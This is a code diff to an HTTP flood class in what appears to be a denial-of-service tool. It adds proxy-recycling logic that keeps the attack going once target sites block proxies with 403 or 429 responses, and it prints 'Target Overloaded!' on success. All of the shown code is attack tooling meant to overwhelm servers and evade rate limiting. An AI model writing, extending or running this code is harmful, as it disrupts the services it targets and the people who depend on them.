@@ -1588,7 +1588,12 @@ class HttpFlood(Thread):
                     self._current_proxy = p_str # Keep sync with other methods
                     break
             else:
-                return # All burned, wait for recycle
+                # [PHASE 13] Trigger recycle if all proxies are burned
+                global RECYCLE_EVENT, IS_RECYCLING
+                if not IS_RECYCLING:
+                    RECYCLE_EVENT.set()
+                sleep(2)
+                return 
 
         headers = {
             "User-Agent": ua,
@@ -1624,8 +1629,14 @@ class HttpFlood(Thread):
                         print(f"[{int(CONNECTIONS_SENT)}] [STATUS {resp.status_code}] H2_FLOOD: Target Overloaded!")
                     elif resp.status_code in {403, 429}:
                         if proxy_url:
-                            BURNED_PROXIES[str(p)] = time()
+                            BURNED_PROXIES[p_str] = time()
                         raise Exception("Proxy Blocked")
+                
+                # [PHASE 13] Check if recycle target reached
+                if len(BURNED_PROXIES) > len(self._proxies) * 0.8:
+                    global RECYCLE_EVENT, IS_RECYCLING
+                    if not IS_RECYCLING:
+                        RECYCLE_EVENT.set()
         except Exception:
             # If client fails, close it so it recreates next time
             if hasattr(self, '_h2_client'):
